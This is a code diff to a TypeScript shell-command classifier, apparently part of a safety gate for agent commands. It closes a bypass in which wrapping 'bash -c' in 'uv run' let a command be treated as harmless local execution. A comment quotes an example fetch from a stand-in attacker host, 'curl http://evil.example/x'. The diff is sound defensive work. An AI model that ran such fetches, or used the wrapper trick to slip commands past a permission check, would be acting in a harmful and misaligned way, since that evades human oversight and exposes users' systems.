@@ -1644,7 +1644,11 @@ function classifySingleCommand(command: string): ClassifyResult {
         .replace(/^(?:--[a-zA-Z0-9-]+(?:\s+\S+)?\s+)+/, '')
         .trim()
       const interp = afterRun.split(/\s+/)[0]?.toLowerCase().split('/').pop() ?? ''
-      if (LOCAL_EXEC_COMMANDS.has(interp) || PY_INTERPRETER_RE.test(interp)) {
+      // Same wrapper-strip for shell interpreters: `uv run bash -c "curl
+      // http://evil.example/x"` must hit the bash -c recursion like bare
+      // `bash -c`, not ride local_exec (R13-followup, same allow-side class).
+      if (LOCAL_EXEC_COMMANDS.has(interp) || PY_INTERPRETER_RE.test(interp) ||
+          ['bash', 'sh', 'zsh', 'dash'].includes(interp)) {
         const inner = classifyBashCommand(afterRun, [])
         if (inner.category !== 'local_exec') return inner
       }
